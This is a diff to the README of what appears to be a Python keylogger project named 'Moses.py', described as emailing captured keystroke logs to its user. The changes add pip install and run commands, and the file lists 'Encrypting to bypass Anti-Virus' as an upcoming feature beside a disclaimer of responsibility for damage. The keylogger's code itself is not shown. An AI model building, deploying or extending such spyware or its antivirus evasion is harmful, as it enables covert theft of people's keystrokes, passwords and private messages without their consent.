@@ -8,7 +8,17 @@ Making a .pyw keylogger that will send your email the logs every time you select
 # Upcoming Features -
 
 Encrypting to bypass Anti-Virus.
-Auto-convert to EXE.
+...
+
+# Download/Running Instructions - 
+
+```
+pip install -r requirements.txt
+```
+
+```
+python3 Moses.py
+```
 
 # IMPORTANT -
 ***Im not responsible for any Damage caused by this Program!***
